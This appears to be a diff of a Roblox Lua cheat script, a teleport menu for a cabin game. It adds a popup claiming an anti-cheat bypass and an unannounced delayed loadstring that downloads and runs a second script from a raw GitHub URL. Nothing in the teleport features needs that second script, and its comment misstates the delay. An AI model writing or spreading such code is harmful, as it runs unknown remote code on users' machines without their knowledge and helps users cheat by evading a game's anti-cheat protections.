@@ -1,143 +1,97 @@
 -- Carrega a biblioteca Rayfield
-
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 -- Cria janela/interface
-
 local Window = Rayfield:CreateWindow({
-
     Name = "Teleport Menu night 3 cabins",
-
     LoadingTitle = "Teleport System",
-
     LoadingSubtitle = "Shadown_gd",
-
     ConfigurationSaving = {
-
         Enabled = true,
-
         FileName = "TeleportMenuConfig"
-
     }
-
 })
 
--- Cria aba
+-- Mostra notificação inicial
+Rayfield:Notify({
+    Title = "Credits: juão",
+    Content = "bypassed anti-cheat (It's not 100% safe)",
+    Duration = 10,
+    Image = 4483362458
+})
 
+-- Aguarda 10 segundos e executa o loadstring
+task.delay(1, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/Nicescript/refs/heads/main/game%20happy", true))()
+end)
+
+-- Cria aba principal
 local TeleportTab = Window:CreateTab("Teleports", 4483362458)
 
--- Função de teleporte
-
+-- Serviços e função de teleporte
 local Players = game:GetService("Players")
-
+local Workspace = game:GetService("Workspace")
 local player = Players.LocalPlayer
 
-local function teleportTo(pos)
-
-    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-
-        player.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
-
+local function teleportTo(position)
+    local character = player.Character or player.CharacterAdded:Wait()
+    local root = character:FindFirstChild("HumanoidRootPart")
+    if root then
+        root.CFrame = CFrame.new(position)
     end
-
 end
 
--- Adiciona botões com Rayfield para cada teleporte
-
+-- Botões de teleporte
 TeleportTab:CreateButton({
-
     Name = "Cabin 1",
-
     Callback = function()
-
         teleportTo(Vector3.new(102, 4, -245))
-
     end
-
 })
 
 TeleportTab:CreateButton({
-
     Name = "Cabin 2",
-
     Callback = function()
-
         teleportTo(Vector3.new(-33, 4, 68))
-
     end
-
 })
 
 TeleportTab:CreateButton({
-
     Name = "Cabin 3",
-
     Callback = function()
-
         teleportTo(Vector3.new(-40, 4, 267))
-
     end
-
 })
 
 TeleportTab:CreateButton({
-
     Name = "Cabin 4",
-
     Callback = function()
-
         teleportTo(Vector3.new(231, 4, 243))
-
     end
-
 })
 
 TeleportTab:CreateButton({
-
     Name = "Lodge",
-
     Callback = function()
-
         teleportTo(Vector3.new(-233, 17, 110))
-
     end
-
 })
 
 TeleportTab:CreateButton({
-
-    Name = "Safe Zone(fully working)",
-
+    Name = "Safe Zone (fully working)",
     Callback = function()
-
-        teleportTo(Vector3.new(47, 13, 67))
+        teleportTo(Vector3.new(-88, 4, 311))
 
         -- Criação do chão invisível sólido
-
-        local Workspace = game:GetService("Workspace")
-
-        local existing = Workspace:FindFirstChild("SafeZoneFloor")
-
-        if not existing then
-
+        if not Workspace:FindFirstChild("SafeZoneFloor") then
             local floor = Instance.new("Part")
-
             floor.Name = "SafeZoneFloor"
-
             floor.Size = Vector3.new(100, 1, 100)
-
-            floor.Position = Vector3.new(47, 7, 67)
-
+            floor.Position = Vector3.new(47, 20, 67)
             floor.Anchored = true
-
             floor.CanCollide = true
-
-            floor.Transparency = 0.8
-
+            floor.Transparency = 0.9
             floor.Parent = Workspace
-
         end
-
     end
-
 })
